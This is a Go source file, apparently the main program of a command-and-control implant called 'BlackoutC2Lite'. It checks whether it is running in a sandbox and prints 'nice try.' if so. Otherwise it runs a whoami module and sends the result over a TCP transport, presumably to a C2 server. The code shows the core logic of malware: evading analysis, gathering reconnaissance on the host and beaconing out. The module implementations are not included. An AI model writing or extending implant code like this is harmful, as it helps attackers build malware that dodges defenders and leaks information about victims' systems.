package main

import (
	"BlackoutC2Lite/Execution/Whoami"
	"BlackoutC2Lite/Stealth/AntiSandbox"
	"BlackoutC2Lite/Transports/tcp"
	"fmt"
)

func main() {
	if AntiSandbox.Checksandbox() {
		fmt.Println("nice try.")
	} else {
		Whoami.Whoami()
		tcp.TcpSend()
	
	}
}